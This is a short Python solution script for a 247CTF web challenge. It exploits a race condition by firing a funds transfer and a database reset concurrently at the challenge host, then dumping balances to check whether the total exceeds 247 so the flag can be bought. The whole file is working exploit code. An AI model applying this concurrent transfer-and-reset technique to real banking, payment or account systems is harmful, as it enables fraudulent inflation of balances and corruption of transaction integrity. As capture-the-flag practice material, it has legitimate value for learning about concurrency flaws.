#!/usr/bin/python3

import requests
import sys
import threading

HOST = "https://8a8910d6682dde49.247ctf.com/"

'''
Send from 1 -> 2
Reset
'''

def sendFromTo(sender, receiver, amount):
    params = {"from": sender,
              "to": receiver,
              "amount": amount}
    resp = requests.get(HOST, params=params)
    if (resp.status_code != 200):
        print(f"ERROR sendFromTo ({resp.status_code})")
        exit()

def sendReset():
    params = {"reset": ""}
    resp = requests.get(HOST, params=params)
    if (resp.status_code != 200):
        print(f"ERROR sendReset ({resp.status_code})")
        exit()

def sendDump():
    params = {"dump": ""}
    resp = requests.get(HOST, params=params)
    if (resp.status_code != 200):
        print(f"ERROR sendDump ({resp.status_code})")
        exit()
    return resp.text


def log(f):
    def inner(*args, **kwargs):
        print(f"Running {f}({args},{kwargs})")
        rv = f(*args,**kwargs)
        print(f"{f}({args},{kwargs})={rv}")
        return rv
    return inner

@log
def thread1Func():
    sendFromTo(1, 2, 196)

@log
def thread2Func():
    sendReset()

def main():
    thread1 = threading.Thread(target=thread1Func)
    thread2 = threading.Thread(target=thread2Func)
    thread2.start()
    thread1.start()
    thread1.join()
    thread2.join()
    print(sendDump())
    # If the corruption of the database was succesful, the sum of the users' funds should be over 247, so you can go and buy the flag now!

if __name__ == "__main__":
    main()
